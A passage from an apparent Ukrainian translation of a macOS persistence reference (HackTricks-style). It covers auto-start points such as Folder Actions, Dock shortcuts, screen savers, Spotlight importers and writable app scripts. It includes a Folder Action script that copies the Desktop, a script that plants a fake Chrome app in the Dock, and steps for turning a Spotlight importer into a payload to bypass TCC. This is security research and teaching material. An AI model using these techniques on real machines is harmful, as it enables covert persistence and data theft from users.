- **Ціль запису:** виконуваний пакет програми або інший файл, **уже вибраний** у спеціальному сповіщенні Calendar **Open file**. Щоб створити або відредагувати саме сповіщення, потрібен доступ до відповідної події календаря через Calendar або підключене джерело даних календаря; випадковий запис у файл не створює сповіщення.
- **Тригер:** запланований час сповіщення на Mac, де Calendar обробляє подію. Повторювана подія може повторно виконувати цю дію. [Актуальний посібник Apple для Calendar](https://support.apple.com/guide/calendar/icl1012/mac) підтверджує наявність параметра сповіщення **Custom → Open file** у macOS 26.
- **Ідентичність виконання та обмеження:** Calendar відкриває вибраний файл для авторизованого користувача за допомогою пов’язаної з ним програми. Запуск пакета програми може виконати її код від імені цього користувача з урахуванням Gatekeeper, карантину та інших перевірок macOS. Звичайний файл скрипту може лише відкритися в редакторі; сама лише його розширення не доводить, що код буде виконано.

Щоб безпечно оцінити можливий варіант, перевірте сповіщення події в Calendar і дозволи вибраного файлу. Цей шлях задокументовано за посібником Apple і **не тестувався** на дослідницькому Mac, оскільки тестування змінило б активний календар і вимагало б чекати на подію на робочому столі. У тимчасовому обліковому записі можна вибрати пакет програми, який лише створює маркер, налаштувати сповіщення Open file на найближчий час, підтвердити запуск, а потім видалити подію та програму.

### Автоматизації Shortcuts у macOS

- **Ціль запису:** виконуваний файл, **на який уже посилається** дія ярлика, або наявний ярлик, який уповноважений користувач може редагувати. Випадковий файл `.shortcut` або запис у недокументовану базу даних Shortcuts — це не підтримуваний спосіб реєстрації автоматизації.
- **Тригер та ідентичність:** раніше налаштована й увімкнена подія автоматизації, наприклад певний час доби або подія програми, запускає ярлик від імені авторизованого користувача. [Актуальний посібник Apple з автоматизації на Mac](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) містить перелік підтримуваних подій, пояснює, коли автоматизація може запускатися без запиту, і описує видалення тригера. [Посібник Apple з приватності Shortcuts](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) вимагає ввімкнути **Allow Running Scripts** для дій зі скриптами; окремі дії все одно можуть запитувати дозволи.

Це умовний шлях «запис — виконання», **лише якщо наявна дія завантажує ціль, доступну для запису**. Створення нової автоматизації через інтерфейс змінює активні налаштування, тому цього не робили на дослідницькому Mac. У тимчасовому обліковому записі власник може налаштувати ярлик на певний час доби, скрипт якого створює `/tmp/ht-shortcuts-marker`, надати потрібні дозволи, перевірити наявність маркера після події, а потім видалити автоматизацію, ярлик і маркер.

### Дії Automator і Quick Actions

- **Цілі запису:** `~/Library/Automator/*.action` (користувацькі) та `/Library/Automator/*.action` (адміністраторські) для пакетів дій. Збережений робочий процес Quick Action зазвичай розташований у `~/Library/Services/*.workflow`; перевірте фактичний шлях робочого процесу, вибраний користувачем. [Довідник Apple з Automator framework](https://developer.apple.com/documentation/automator) містить перелік каталогів пошуку дій.
- **Тригер:** Automator завантажує доступні пакети дій під час запуску, але завдання дії виконується лише під час запуску робочого процесу, який її використовує. Quick Action запускається, коли користувач вибирає його у Finder, Services або іншому доступному меню. Робочий процес Folder Action запускається, коли елементи додають до його **вже підключеної** папки, а робочий процес Calendar Alarm — у час відповідної події. [Типи робочих процесів Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) розрізняють ці події. Сам по собі запис дії або робочого процесу не підключає папку й не планує подію календаря.
- **Ідентичність виконання та обмеження:** обліковий запис, від імені якого запущено робочий процес; Automator або програма, що його викликає, мають завантажити дію, а поточні перевірки підпису коду чи приватності мають дозволити це. Пакет дій, доступний для запису й уже задіяний активним робочим процесом, — це інший випадок, ніж встановлення нової дії та очікування, поки її виберуть.

На тестовому Mac із macOS 26.5.2 були наявні каталоги користувача `Automator` і `Services`; `/Library/Automator` був відсутній. Активний робочий процес не створювали, не підключали й не запускали. Щоб перевірити конкретний шлях завантаження, скористайтеся тимчасовим обліковим записом і дією/робочим процесом, що лише створює маркер. В окремому розділі [Folder Actions](#folder-actions) докладніше розглянуто це джерело подій.

### Folder Actions

Опис: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Опис: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але для налаштування Folder Actions потрібно мати змогу викликати `osascript` з аргументами, щоб взаємодіяти з **`System Events`**
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Має базові дозволи TCC, зокрема для Desktop, Documents і Downloads

#### Розташування

- **`/Library/Scripts/Folder Action Scripts`**
  - Потрібні права root
  - **Тригер**: доступ до вказаної папки
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Тригер**: доступ до вказаної папки

#### Опис і експлуатація

Folder Actions — це скрипти, які автоматично запускаються у відповідь на зміни в папці, наприклад додавання чи видалення елементів або інші дії, як-от відкриття чи змінення розміру вікна папки. Ці дії можна використовувати для різних завдань і запускати різними способами, наприклад через інтерфейс Finder або команди термінала.<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions можна налаштувати кількома способами:

1. Створити робочий процес Folder Action за допомогою [Automator](https://support.apple.com/guide/automator/welcome/mac) і встановити його як службу.
2. Вручну підключити скрипт через Folder Actions Setup у контекстному меню папки.
3. Використати OSAScript, щоб надсилати повідомлення Apple Event до `System Events.app` і програмно налаштувати Folder Action.
   - Цей спосіб особливо корисний для вбудовування дії в систему, забезпечуючи певний рівень persistence.

Нижче наведено приклад скрипту, який можна виконати за допомогою Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Щоб зробити наведений вище скрипт придатним для використання з Folder Actions, скомпілюйте його за допомогою:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Після компіляції скрипту налаштуйте Folder Actions, виконавши наведений нижче скрипт. Він глобально ввімкне Folder Actions і прив’яже раніше скомпільований скрипт до папки «Робочий стіл».

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Запустіть скрипт налаштування за допомогою:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Ось як реалізувати цю persistence через GUI:

Цей скрипт буде виконано:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Скомпілюйте його за допомогою: `osacompile -l JavaScript -o folder.scpt source.js`

Перемістіть його до:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Потім відкрийте програму `Folder Actions Setup`, виберіть **папку, за якою хочете стежити**, а потім виберіть у своєму випадку **`folder.scpt`** (у моєму випадку я назвав її output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Тепер, якщо відкрити цю папку за допомогою **Finder**, ваш скрипт буде виконано.

Цю конфігурацію було збережено у форматі base64 у **plist**, розташованому за шляхом **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Тепер спробуймо підготувати цю persistence без доступу до GUI:

1. **Скопіюйте `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** до `/tmp`, щоб створити резервну копію:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Видаліть** щойно налаштовані Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Тепер, коли ми маємо порожнє середовище

3. Скопіюйте файл резервної копії: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Відкрийте Folder Actions Setup.app, щоб застосувати цю конфігурацію: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> У мене це не спрацювало, але ось інструкції з опису:(

### Ярлики Dock

Опис: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але у вас має бути встановлена шкідлива програма в системі
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `~/Library/Preferences/com.apple.dock.plist`
  - **Тригер**: коли користувач натискає на програму в Dock

#### Опис і експлуатація

Усі програми, що відображаються в Dock, зазначені у plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

**Додати програму** можна просто за допомогою:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

За допомогою певної **соціальної інженерії** можна **замаскуватися, наприклад, під Google Chrome** у Dock і фактично виконати власний скрипт:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Методи введення

- **Ціль для запису:** Bundle застосунку методу введення з кодом, встановлений у `~/Library/Input Methods/` (користувач) або `/Library/Input Methods/` (адміністратор). Це відрізняється від звичайних текстових файлів розкладок клавіатури Apple `.inputplugin`, які самі по собі не є payload із довільним кодом.
- **Тригер:** Користувач додає/вмикає джерело введення в **System Settings → Keyboard → Text Input**, а потім вибирає або використовує його. Сам факт копіювання bundle у каталог не доводить, що macOS його запустить. [Актуальний посібник Apple з джерел введення](https://support.apple.com/guide/mac-help/mchl84525d76/mac) описує вмикання та перемикання джерел; [документація Apple InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) стосується методів введення з кодом.
- **Ідентичність виконання та обмеження:** Метод запускається від імені користувача, який увійшов у систему, з урахуванням реєстрації методу введення, підпису коду та актуальних перевірок безпеки macOS. Для вже ввімкнених методів із виконуваним файлом, доступним для запису, потрібні окрема перевірка шляху та аналіз підпису.

У давнішій [примітці Apple про сторонні методи введення](https://developer.apple.com/library/archive/qa/qa1810/_index.html) уже попереджали, що копіювання певних методів-палітр у ці каталоги навіть не призводить до їх появи в Input Sources. На дослідницькому Mac з macOS 26.5.2 каталог користувача існує, але жоден bundle не встановлено й не активовано, тож це документований умовний шлях, а не локально підтверджений результат виконання.

### Вибір кольору

Опис: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Може допомогти обійти sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Має відбутися дуже конкретна дія
  - Зрештою ви опинитеся в іншому sandbox
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `/Library/ColorPickers`
  - Потрібні права root
  - Тригер: використання палітри кольорів
- `~/Library/ColorPickers`
  - Тригер: використання палітри кольорів

#### Опис та експлуатація

**Зберіть** bundle палітри кольорів зі своїм кодом (наприклад, можна використати [**оцей**](https://github.com/viktorstrate/color-picker-plus)) і додайте конструктор (як у розділі [Screen Saver](macos-auto-start-locations.md#screen-saver)), а потім скопіюйте bundle до `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Після виклику палітри кольорів ваш bundle також має виконатися.

Цей сценарій залежить від того, чи відкриє сумісний застосунок системну панель кольорів і чи вибере встановлену палітру. [Посібник Apple з панелі кольорів](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) описує застарілі розташування bundle. Локальна перевірка шляху виявила застарілу службу XPC палітри кольорів, але на дослідницькому Mac жодну палітру не було встановлено чи завантажено; не слід робити висновок про обхід TCC лише на підставі наявності цього шляху.

Зауважте, що бінарний файл, який завантажує вашу бібліотеку, працює в **дуже обмежувальному sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Плагіни Finder Sync

**Опис**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Опис**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Корисно для обходу sandbox: **Ні, оскільки потрібно запустити власний застосунок**
- Обхід TCC: Залежить від sandbox і дозволів увімкненого розширення; загального способу обходу не встановлено.

#### Розташування

- Конкретний застосунок

#### Опис і експлуатація

Приклад застосунку з Finder Sync Extension [**можна знайти тут**](https://github.com/D00MFist/InSync).

Застосунки можуть містити `Finder Sync Extensions`. Це розширення буде частиною застосунку, який запускатиметься. Крім того, щоб розширення могло виконувати свій код, воно **має бути підписане** дійсним сертифікатом розробника Apple, **ізольоване в sandbox** (хоча можна додати менш суворі винятки) і зареєстроване за допомогою чогось на кшталт:<sup>[[21]](#references)[[22]](#references)</sup>

Встановлене розширення також потрібно **увімкнути** й викликати для відповідного розташування або елемента у Finder; створити довільний пакет `.appex` недостатньо. [Finder Sync API від Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) надає інформацію про стан увімкнення. Наведені нижче команди `pluginkit` демонструють явну реєстрацію та ввімкнення, а не автозапуск лише на основі наявності файлу. Цей спосіб було перевірено за документацією; на дослідницькому Mac не встановлювали й не вмикали жодних нових розширень.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Заставка екрана

Опис: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Опис: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але в результаті ви опинитеся у звичайному sandbox застосунку
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- `/System/Library/Screen Savers`
  - Потрібні права root
  - **Тригер**: Вибрати заставку екрана
- `/Library/Screen Savers`
  - Потрібні права root
  - **Тригер**: Вибрати заставку екрана
- `~/Library/Screen Savers`
  - **Тригер**: Вибрати заставку екрана

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Опис і експлуатація

Створіть новий проєкт в Xcode та виберіть шаблон для створення нової **Заставки екрана**. Потім додайте до неї свій код, наприклад, наведений нижче код для створення журналів.<sup>[[23]](#references)[[24]](#references)</sup>

**Зберіть** проєкт і скопіюйте пакет `.saver` у **`~/Library/Screen Savers`**. Потім відкрийте графічний інтерфейс заставки екрана й просто натисніть на неї — має з’явитися багато записів у журналі:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Зверніть увагу: оскільки в entitlements бінарного файлу, який завантажує цей код (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), є **`com.apple.security.app-sandbox`**, ви перебуватимете у звичайній sandbox застосунку.

Код заставки:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Плагіни Spotlight

опис: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але зрештою ви опинитеся в application sandbox
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox виглядає дуже обмеженим

#### Розташування

- `~/Library/Spotlight/`
  - **Тригер**: створюється новий файл із розширенням, яке обробляє плагін Spotlight.
- `/Library/Spotlight/`
  - **Тригер**: створюється новий файл із розширенням, яке обробляє плагін Spotlight.
  - Потрібен root
- `/System/Library/Spotlight/`
  - **Тригер**: створюється новий файл із розширенням, яке обробляє плагін Spotlight.
  - Потрібен root
- `Some.app/Contents/Library/Spotlight/`
  - **Тригер**: створюється новий файл із розширенням, яке обробляє плагін Spotlight.
  - Потрібен новий застосунок

#### Опис і експлуатація

Spotlight — це вбудована функція пошуку macOS, створена для забезпечення користувачам **швидкого та повного доступу до даних на їхніх комп’ютерах**.\
Щоб забезпечити швидкий пошук, Spotlight підтримує **власну базу даних** і створює індекс, **аналізуючи більшість файлів**, що дає змогу швидко шукати як назви файлів, так і їхній вміст.<sup>[[25]](#references)</sup>

В основі механізму Spotlight лежить центральний процес `mds`, що означає **«metadata server»**. Цей процес керує всією службою Spotlight. Йому допомагають кілька демонів `mdworker`, які виконують різноманітні завдання з обслуговування, наприклад індексують різні типи файлів (`ps -ef | grep mdworker`). Ці завдання виконуються завдяки плагінам-імпортерам Spotlight, або **пакетам «.mdimporter»**, які дають Spotlight змогу розпізнавати й індексувати вміст у різноманітних форматах файлів.

Плагіни, або пакети **`.mdimporter`**, розташовані в згаданих вище місцях. Новий пакет має бути виявлений і відповідати типу файлу, а Spotlight має проіндексувати відповідний файл; самого копіювання пакета недостатньо, щоб підтвердити його завантаження. [Довідник MDImporter від Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) пов’язує завантаження зі зміною відповідного файлу. Виконання імпортера Spotlight у macOS 26 тут не перевірялося.

Можна **знайти всі завантажені `mdimporters`**, виконавши:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

А, наприклад, **/Library/Spotlight/iBooksAuthor.mdimporter** використовується для розбору файлів таких типів (зокрема з розширеннями `.iba` і `.book`):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Якщо перевірити Plist іншого `mdimporter`, запису **`UTTypeConformsTo`** може не бути. Це тому, що це вбудований _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)), для якого не потрібно вказувати розширення.
>
> Крім того, системні плагіни за замовчуванням завжди мають пріоритет, тому зловмисник може отримати доступ лише до файлів, які не індексуються власними `mdimporter` від Apple.

Щоб створити власний importer, можна почати з цього проєкту: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), а потім змінити назву й **`CFBundleDocumentTypes`**, додати **`UTImportedTypeDeclarations`**, щоб він підтримував потрібне розширення, і відобразити їх у **`schema.xml`**.\
Потім **змініть** код функції **`GetMetadataForFile`**, щоб вона виконувала ваш payload, коли створюється файл із відповідним розширенням.

Нарешті, **зіберіть і скопіюйте новий `.mdimporter`** в одне з трьох попередніх розташувань. Перевірити, чи його завантажено, можна **моніторингом логів** або запуском **`mdimport -L`**.

> [!TIP]
> Хоча sandbox importer-а дуже обмежений, `mdworker` індексує файли з **привілейованим доступом на читання**. Тому шкідливий `.mdimporter` може читати *вміст* файлів у захищених TCC розташуваннях (Downloads, Pictures, Desktop, …) і викрадати зібрані метадані без жодного запиту TCC — це **обхід TCC «Sploitlight» (CVE-2025-31199)**, виправлений у macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

Про окрему техніку для macOS 26, яка передає захищені байти в **назвах сповіщень Darwin**, а не в системних логах, див. [Витік даних через Spotlight importer у назвах сповіщень Darwin](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Панель параметрів~~

> [!CAUTION]
> Схоже, це більше не працює.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Потрібна конкретна дія користувача
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Опис

Схоже, це більше не працює.<sup>[[26]](#references)</sup>

### Файли скриптів програм

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але потрібна цільова програма, встановлена та запущена/використана жертвою
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

**Інтерпретований скрипт, який фактично виконує встановлена програма або інструмент і який може змінити зловмисник.** Перевірте права доступу до файлу та шлях виклику; самого факту, що знайдено файл `.sh` або `.py`, недостатньо. У [посібнику Apple з code signing](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) сказано, що підписані пакети програм опечатують ресурси, зокрема скрипти. Редагування скрипту всередині пакета порушує цю цілісність; під час перевірки пакета це можуть виявити або заблокувати. Зовнішній скрипт, як-от launcher Homebrew, має іншу поведінку щодо підпису та довіри. Історичні приклади з writeup:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** — скрипт, який використовували старі версії Sublime Text; для встановленої версії потрібно перевірити наявність файлу та його використання під час запуску. На тестовому Mac його не було.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) або **`/usr/local/bin/brew`** (Intel) — Bash launcher, який виконується під час виклику відповідного шляху `brew`, якщо він встановлений і доступний зловмиснику для запису. На тестовому Mac `/opt/homebrew/bin/brew` був доступним для запису Bash-скриптом; це локальне спостереження, а не загальне правило щодо прав доступу Homebrew.
- **`idlemain.py`** у пакеті програми Python для IDLE — для запису може знадобитися дозвіл адміністратора, але скрипт виконується з ідентифікатором користувача IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** — історичний shell-скрипт, який запускався від root, якщо встановлено відповідне завдання launchd `org.wireshark.ChmodBPF`. На тестовому Mac скрипту та завдання не було.

#### Опис і експлуатація

Деякі інструменти й програми виконують інтерпретовані скрипти під час роботи. Якщо скрипт доступний для запису, додані команди можуть виконатися під час наступного запуску конкретного викликувача, якщо це дозволяють перевірка підпису, quarantine та інші механізми. В оригінальному дослідженні наведено кілька інсталяцій 2019 року; перевірте їхні шляхи та тригери у цільовій версії.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Цей тест копії дав результат `marker fired: True` у macOS 26.5.2; оригінальний launcher не змінювали. Він доводить, що точка вставки виконується в копії, а не те, що змінений підписаний app bundle або справжня інсталяція Homebrew пройде всі перевірки під час запуску.

### Плагіни плитки Dock

Опис: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Потрібно, щоб app, яка оголошує плагін, була виявлена/зареєстрована, а Dock обробив її
  - Плагін завантажується в **підписаний Apple** helper, який не має entitlement app-sandbox і в якому **вимкнено перевірку бібліотек**. У дослідженні, на яке тут посилаються, цей helper не відображався в інтерфейсі Background Task Management; видимість у цільовому релізі слід перевірити.
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, на який посилається ключ **`NSDockTilePlugIn`** у `Info.plist` app; власний `Info.plist` плагіна задає **`NSPrincipalClass`**.

#### Опис і експлуатація

Коли app оголошує `NSDockTilePlugIn`, Dock може завантажити вказаний bundle в XPC helper **`com.apple.dock.external.extra`** (`...extra.arm64` на Apple Silicon) під час входу в систему або додавання його плитки; самій app запускатися не потрібно. Для цього macOS має виявити/зареєструвати app і прийняти її. Helper **підписаний Apple**, не має entitlement `com.apple.security.app-sandbox` і має `com.apple.security.cs.disable-library-validation`. Під час завантаження викликається метод **`setDockTile:`** головного класу; звідти можна підписатися на розподілені сповіщення (наприклад, `com.apple.screenIsLocked`) для отримання подальших подій.<sup>[[38]](#references)</sup>

У macOS 26.5.2 перевірка лише для читання за допомогою `codesign` підтвердила підпис Apple і entitlements helper, а в кількох установлених apps було оголошено `NSDockTilePlugIn`. На цьому Mac не встановлювали й не завантажували новий плагін, тож виконання щойно створеного bundle у цьому релізі залишається неперевіреним.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
